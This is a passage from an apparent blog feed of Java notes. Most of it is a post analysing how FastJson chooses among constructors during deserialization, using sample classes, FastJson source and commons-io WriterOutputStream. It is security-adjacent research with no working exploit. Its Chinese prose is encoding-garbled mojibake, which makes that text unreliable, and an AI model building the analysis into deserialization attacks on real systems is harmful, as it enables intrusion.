ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));</span></span><br><span class="line"><span class="comment">//        objectInputStream.readObject();</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="java" scheme="https://bowuchuling.github.io/categories/java/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/java/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="java" scheme="https://bowuchuling.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>å…³äºFastJsonå¯¹æ„é€ å‡½æ•°çš„è°ƒç”¨ç ”ç©¶</title>
    <link href="https://bowuchuling.github.io/posts/188960jy.html"/>
    <id>https://bowuchuling.github.io/posts/188960jy.html</id>
    <published>2024-04-10T07:51:06.882Z</published>
    <updated>2024-04-10T09:31:58.688Z</updated>
    
    <content type="html"><![CDATA[<h1>å…³äºFastJsonå¯¹æ„é€ å‡½æ•°çš„è°ƒç”¨ç ”ç©¶</h1><h2 id="æ²¡æœ‰æ„é€ å‡½æ•°">æ²¡æœ‰æ„é€ å‡½æ•°</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src.main.fastjsonconstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">noConstructor</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String student;</span><br><span class="line">    <span class="keyword">public</span> String id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(String id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getStudent</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> student;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setStudent</span><span class="params">(String student)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.student = student;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, id=&#x27;&quot;</span> + id + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, student=&#x27;&quot;</span> + student + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;name\&quot;:\&quot;123\&quot;,\&quot;student\&quot;:\&quot;aaa\&quot;,\&quot;id\&quot;:\&quot;456\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">noConstructor</span> <span class="variable">no</span> <span class="operator">=</span> JSON.parseObject(payload, noConstructor.class);</span><br><span class="line">        System.out.println(no);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡º</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User<span class="punctuation">&#123;</span>name=&#x27;<span class="number">123</span>&#x27;<span class="punctuation">,</span> id=&#x27;<span class="number">456</span>&#x27;<span class="punctuation">,</span> student=&#x27;aaa&#x27;<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>è¿™æ˜¯å±äºfjæ¯”è¾ƒå¸¸è§çš„ä¸€ç§æƒ…å†µï¼Œç”±äºæ²¡æœ‰æ„é€ å‡½æ•°ï¼Œæ„é€ å‡½æ•°åœ¨ç¼–è¯‘æœŸé—´ç”±ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆçš„ä¸€ä¸ªæ— å‚æ„é€ å‡½æ•°ï¼Œå†é€šè¿‡è°ƒç”¨å¯¹åº”jsoné”®å€¼çš„getter/setterå‡½æ•°è¿›è¡Œèµ‹å€¼ï¼Œå¦‚æœæœ‰æ— å‚æ„é€ å‡½æ•°çš„è¯ï¼Œå°±ä¼šç›´æ¥è°ƒç”¨æ— å‚æ„é€ å‡½æ•°</p><h2 id="å­˜åœ¨æœ‰å‚æ„é€ å‡½æ•°">å­˜åœ¨æœ‰å‚æ„é€ å‡½æ•°</h2><p>æˆ‘ä»¬å¯¹ä¸Šè¾¹çš„noConstructorç±»å¢åŠ ä¸€ä¸ªæœ‰å‚æ„é€ å‡½æ•°ï¼Œå†æ‰§è¡Œè¯¥ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src.main.fastjsonconstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">noConstructor</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String student;</span><br><span class="line">    <span class="keyword">public</span> String id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">noConstructor</span><span class="params">(String name,String id)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(String id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getStudent</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> student;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setStudent</span><span class="params">(String student)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.student = student;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, id=&#x27;&quot;</span> + id + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, student=&#x27;&quot;</span> + student + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;name\&quot;:\&quot;123\&quot;,\&quot;student\&quot;:\&quot;aaa\&quot;,\&quot;id\&quot;:\&quot;456\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">noConstructor</span> <span class="variable">no</span> <span class="operator">=</span> JSON.parseObject(payload, noConstructor.class);</span><br><span class="line">        System.out.println(no);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡º</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User<span class="punctuation">&#123;</span>name=&#x27;<span class="number">123</span>&#x27;<span class="punctuation">,</span> id=&#x27;<span class="number">456</span>&#x27;<span class="punctuation">,</span> student=&#x27;<span class="literal"><span class="keyword">null</span></span>&#x27;<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°è¿™é‡Œè°ƒç”¨äº†æœ‰å‚æ„é€ å‡½æ•°ï¼Œå¹¶ä¸”å¹¶æ²¡æœ‰ç»™studentèµ‹å€¼ï¼Œå½“æˆ‘ä»¬æ‰‹åŠ¨ä¸ºç±»æ·»åŠ æœ‰å‚æ„é€ å‡½æ•°æ—¶å€™ï¼Œåœ¨ç¼–è¯‘å™¨ç¼–è¯‘æ—¶ï¼Œå°±ä¸ä¼šå†ä¸ºå…¶æ·»åŠ æ— å‚æ„é€ å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´ä½ çš„ç±»æœ‰ä¸”åªæœ‰ä½ æ·»åŠ çš„è¿™ä¸ªæ„é€ å‡½æ•°ã€‚é‚£è¿™æ ·FastJsonæ˜¯å¦‚ä½•ååºåˆ—åŒ–ç”Ÿæˆå®ä¾‹çš„å‘¢ï¼Ÿ</p><h2 id="è°ƒç”¨åˆ†æ">è°ƒç”¨åˆ†æ</h2><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240410160331290.png" alt="image-20240410160331290"></p><p>è¿™æ¬¡è¦è®²çš„é‡ç‚¹åœ¨JavaBeanInfoçš„buildæ–¹æ³•ä¸­ã€‚ä»ç±»åä¸­å¤§å¥–å¯ä»¥çŸ¥é“ï¼Œè¿™æ˜¯FastJsonå†…éƒ¨å­˜å‚¨ååºåˆ—åŒ–å¯¹è±¡ä¿¡æ¯çš„ç±»ã€‚è¿™å…¶ä¸­å°±åŒ…å«äº†åˆ›å»ºè¯¥ç±»çš„æ„é€ æ–¹æ³•ä¿¡æ¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> Constructor&lt;?&gt; getDefaultConstructor(Class&lt;?&gt; clazz, <span class="keyword">final</span> Constructor&lt;?&gt;[] constructors) &#123;</span><br><span class="line">       <span class="keyword">if</span> (Modifier.isAbstract(clazz.getModifiers())) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       Constructor&lt;?&gt; defaultConstructor = <span class="literal">null</span>;</span><br><span class="line">       <span class="comment">//è¿™é‡Œå¾ˆå¥½ç†è§£ å…ˆéå†ä¸‹æ‰€æœ‰çš„æ„é€ å‡½æ•°ï¼Œæ‰¾åˆ°å…¶ä¸­æ— å‚æ„é€ å‡½æ•°</span></span><br><span class="line">       <span class="keyword">for</span> (Constructor&lt;?&gt; constructor : constructors) &#123;</span><br><span class="line">           <span class="keyword">if</span> (constructor.getParameterTypes().length == <span class="number">0</span>) &#123;</span><br><span class="line">               defaultConstructor = constructor;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (defaultConstructor == <span class="literal">null</span>) &#123;</span><br><span class="line">           <span class="keyword">if</span> (clazz.isMemberClass() &amp;&amp; !Modifier.isStatic(clazz.getModifiers())) &#123;</span><br><span class="line">               Class&lt;?&gt;[] types;</span><br><span class="line">               <span class="keyword">for</span> (Constructor&lt;?&gt; constructor : constructors) &#123;</span><br><span class="line">                   <span class="keyword">if</span> ((types = constructor.getParameterTypes()).length == <span class="number">1</span></span><br><span class="line">                           &amp;&amp; types[<span class="number">0</span>].equals(clazz.getDeclaringClass())) &#123;</span><br><span class="line">                       defaultConstructor = constructor;</span><br><span class="line">                       <span class="keyword">break</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> defaultConstructor;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä½¿ç”¨æ— å‚æ„é€ å‡½æ•°è¿›è¡Œååºåˆ—åŒ–</p><p>ä»è°ƒè¯•çŠ¶æ€çš„ä¿¡æ¯å¯ä»¥çœ‹åˆ°é»˜è®¤æ„é€ å‡½æ•°æ˜¯æ— å‚æ„é€ å‡½æ•°ï¼Œé»˜è®¤æ„é€ å‡½æ•°çš„å‚æ•°é•¿åº¦ä¸º0ä¸ªã€‚</p><p>ä¸‹é¢æ˜¯æœ‰å‚æ„é€ å‡½æ•°çš„ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="variable">is_public</span> <span class="operator">=</span> (constructor.getModifiers() &amp; Modifier.PUBLIC) != <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!is_public) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å‰é¢çš„æ–¹æ³•éƒ½æ˜¯è¿›è¡Œä¸€äº›è¿‡æ»¤ ä¸‹é¢çš„æ‰æ˜¯è·å–æ‰‹åŠ¨æœ‰å‚æ„é€ å‡½æ•°çš„å…³é”®ã€‚</span></span><br><span class="line"><span class="comment">//é¦–å…ˆä¼šè·å–æ„é€ å‡½æ•°çš„å‚æ•°åç§°åˆ—è¡¨ å¦‚æœå‚æ•°åˆ—è¡¨ä¸ºç©ºæˆ–è€…é•¿åº¦ä¸º0 åˆ™æ”¾å¼ƒè¯¥æ–¹æ³•ï¼Œå¼€å§‹ä¸‹ä¸€æ¬¡å¾ªç¯</span></span><br><span class="line"><span class="comment">//è¿™é‡Œçš„è·å–å‚æ•°åç§°ä½¿ç”¨çš„å¹¶ä¸æ˜¯java8ä¸­æä¾›çš„è·å–æ–¹æ³•å‚æ•°åç§°çš„æ–¹å¼</span></span><br><span class="line"><span class="comment">//è€Œæ˜¯é€šè¿‡æµè¯»å–classæ–‡ä»¶çš„çš„æ–¹å¼æ¥è·å–çš„</span></span><br><span class="line">String[] lookupParameterNames = ASMUtils.lookupParameterNames(constructor);</span><br><span class="line"><span class="keyword">if</span> (lookupParameterNames == <span class="literal">null</span> || lookupParameterNames.length == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ä¸‹é¢è¿™æ®µæ–¹æ³•å¾ˆæ˜¾ç„¶å°±æ˜¯åœ¨æ¯”è¾ƒå¹¶äº¤æ¢ï¼Œå¦‚æœè¯¥æœ‰å‚æ„é€ å‡½æ•°çš„å‚æ•°ä¸ªæ•°å¤§äºä¹‹å‰çš„æ„é€ æ–¹æ³•ä¸­</span></span><br><span class="line"><span class="comment">//å‚æ•°ä¸ªæ•°æœ€å¤šçš„æ„é€ æ–¹æ³•ï¼Œåˆ™ç”¨è¿™ä¸ªæ„é€ æ–¹æ³•å’Œå‚æ•°åç§°æ•°ç»„æ›¿æ¢ä¹‹å‰ä¿å­˜çš„æ„é€ æ–¹æ³•å’Œå‚æ•°åç§°æ•°ç»„</span></span><br><span class="line"><span class="keyword">if</span> (creatorConstructor != <span class="literal">null</span>&amp;&amp; paramNames != <span class="literal">null</span> &amp;&amp; lookupParameterNames.length &lt;= paramNames.length) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„æ–¹æ³•çš„ä½œç”¨æ˜¯ä»æ‰€æœ‰çš„æ„é€ æ–¹æ³•ä¸­è·å–å‚æ•°æœ€å¤šçš„ä¸€ä¸ªï¼Œå¹¶å°†å…¶æ”¾å…¥JaveBeanInfoçš„creatorConstructorå±æ€§ä¸­ï¼Œä¾›åé¢å®ä¾‹åŒ–å¯¹è±¡ä½¿ç”¨ã€‚è¦ç‰¹åˆ«æ³¨æ„ä¸€ä¸‹ï¼Œè¿™é‡Œçš„è·å–å‚æ•°åç§°ä½¿ç”¨çš„å¹¶ä¸æ˜¯java8ä¸­æä¾›çš„è·å–æ–¹æ³•å‚æ•°åç§°çš„æ–¹å¼ï¼Œè€Œæ˜¯é€šè¿‡æµè¯»å–classæ–‡ä»¶çš„çš„æ–¹å¼æ¥è·å–çš„ã€‚åœ¨èµ‹å€¼çš„æ—¶å€™ï¼Œä¼šé€šè¿‡å‚æ•°åç§°å»jsonä¸²ä¸­æŸ¥æ‰¾å¯¹åº”åç§°çš„å­—æ®µæ¥èµ‹å€¼ï¼Œå¹¶ä¸”åœ¨é€šè¿‡æ„é€ å‡½æ•°èµ‹å€¼å®Œæ¯•ä¹‹åï¼Œå°†ä¸å†é€šè¿‡setæ–¹æ³•èµ‹å€¼ï¼ˆè¿™é‡Œæœ‰å‘ä¸€å®šè¦è®°ä½ï¼Œå¦åˆ™ä¼šå‡ºç°èµ‹å€¼ä¸ä¸Šçš„è«åå…¶å¦™çš„é”™è¯¯ï¼‰ã€‚</p><h2 id="è°ƒç”¨æµç¨‹å›¾">è°ƒç”¨æµç¨‹å›¾</h2><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240410161751148.png" alt="image-20240410161751148"></p><h2 id="å­˜åœ¨å¤šä¸ªå‚æ•°æ•°é‡ç›¸åŒçš„æ„é€ å‡½æ•°ï¼ˆè°ƒç”¨éšæœºæ€§ï¼‰">å­˜åœ¨å¤šä¸ªå‚æ•°æ•°é‡ç›¸åŒçš„æ„é€ å‡½æ•°ï¼ˆè°ƒç”¨éšæœºæ€§ï¼‰</h2><p>è¯•éªŒç¯å¢ƒjdk8u271 commons-io2.4</p><p>è¿™é‡Œå°±ä»¥org.apache.commons.io.output.WriterOutputStreamç±»ä¸ºä¾‹è¿›è¡Œåˆ†æ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">WriterOutputStream</span><span class="params">(Writer writer, CharsetDecoder decoder)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(writer, (CharsetDecoder)decoder, <span class="number">1024</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WriterOutputStream</span><span class="params">(Writer writer, CharsetDecoder decoder, <span class="type">int</span> bufferSize, <span class="type">boolean</span> writeImmediately)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.decoderIn = ByteBuffer.allocate(<span class="number">128</span>);</span><br><span class="line">        <span class="built_in">this</span>.writer = writer;</span><br><span class="line">        <span class="built_in">this</span>.decoder = decoder;</span><br><span class="line">        <span class="built_in">this</span>.writeImmediately = writeImmediately;</span><br><span class="line">        <span class="built_in">this</span>.decoderOut = CharBuffer.allocate(bufferSize);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WriterOutputStream</span><span class="params">(Writer writer, Charset charset, <span class="type">int</span> bufferSize, <span class="type">boolean</span> writeImmediately)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(writer, charset.newDecoder().onMalformedInput(CodingErrorAction.REPLACE).onUnmappableCharacter(CodingErrorAction.REPLACE).replaceWith(<span class="string">&quot;?&quot;</span>), bufferSize, writeImmediately);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WriterOutputStream</span><span class="params">(Writer writer, Charset charset)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(writer, (Charset)charset, <span class="number">1024</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WriterOutputStream</span><span class="params">(Writer writer, String charsetName, <span class="type">int</span> bufferSize, <span class="type">boolean</span> writeImmediately)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(writer, Charset.forName(charsetName), bufferSize, writeImmediately);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WriterOutputStream</span><span class="params">(Writer writer, String charsetName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(writer, (String)charsetName, <span class="number">1024</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WriterOutputStream</span><span class="params">(Writer writer)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(writer, (Charset)Charset.defaultCharset(), <span class="number">1024</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢å°±æ˜¯è¯¥ç±»çš„æ„é€ å‡½æ•°ï¼Œè¶³è¶³æœ‰ä¸ƒä¸ªï¼ŒæŒ‰ç…§ä¸Šé¢çš„åˆ†æï¼Œè¿™é‡Œåº”è¯¥ä¼šè°ƒç”¨å‚æ•°æœ€å¤šçš„æ„é€ å‡½æ•°ï¼Œä½†å‚æ•°æœ€å¤šï¼ˆå››ä¸ªï¼‰æ„é€ å‡½æ•°æœ‰ä¸¤ä¸ªï¼Œè¿™ç©¶ç«Ÿä¼šè°ƒç”¨å“ªä¸ªå‘¢ï¼Ÿ</p><p>è¿™é‡Œæˆ‘ä»¬ç»§ç»­è·Ÿè¿›fjçš„JavaBeanInfoç±»çš„æºç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lookupParameterNames.length &gt; paramNames.length</span><br></pre></td></tr></table></figure><p>åˆšåˆšå·²ç»è¯´è¿‡ï¼Œè¿™ä¸ªä½ç½®æ˜¯åˆ¤æ–­æ„é€ å‡½æ•°çš„å‚æ•°æ•°é‡çš„ï¼Œæˆ‘ä»¬å¾€å›æ‰¾</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240410162101563.png" alt="image-20240410162101563"></p><p>å°±åœ¨æ­£ä¸Šæ–¹å°±æ‰¾åˆ°äº†è¿™ä¸ªconstructorï¼Œçœ‹åå­—å¤§è‡´å°±å¯ä»¥æ‰å‡ºæ¥è¿™ä¸ªåº”è¯¥å°±æ˜¯æˆ‘ä»¬çš„æœ‰å‚æ„é€ å‡½æ•°ï¼Œé‚£è¿™ä¸ªconstructoræ˜¯æ€ä¹ˆæ¥çš„ï¼Ÿæˆ‘ä»¬å‘ä¸Šåˆ†æ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240410162323007.png" alt="image-20240410162323007"></p><p>ä¸éš¾æ‰¾åˆ°å¦‚ä¸Šä»£ç ç‰‡æ®µï¼Œè¿™é‡Œå¾ªç¯ä»0å°†è·å¾—çš„var21èµ‹å€¼ç»™constructorï¼ŒçŒœæµ‹è¿™é‡Œçš„var21åº”è¯¥æ˜¯æ„é€ 